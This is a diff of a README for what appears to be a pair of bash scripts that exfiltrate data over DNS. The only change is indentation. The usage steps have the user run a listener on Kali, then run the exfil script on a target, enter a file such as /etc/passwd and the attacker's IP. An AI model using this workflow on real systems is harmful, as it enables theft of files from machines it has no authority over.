@@ -10,10 +10,10 @@ tcpdump, dig, base64 (pre-installed on most Linux)
 
 # Usage
 1. On Kali (Listener)
-   sudo ./bash-DNS-listener.sh
+sudo ./bash-DNS-listener.sh
 Wait for data, then press Ctrl+C to decode
 2. On Target (Exfiltration)
-  ./bash-DNS-exfil.sh
+./bash-DNS-exfil.sh
 Enter file path (e.g., /etc/passwd)
 Enter Kali IP address
 3. Check Results
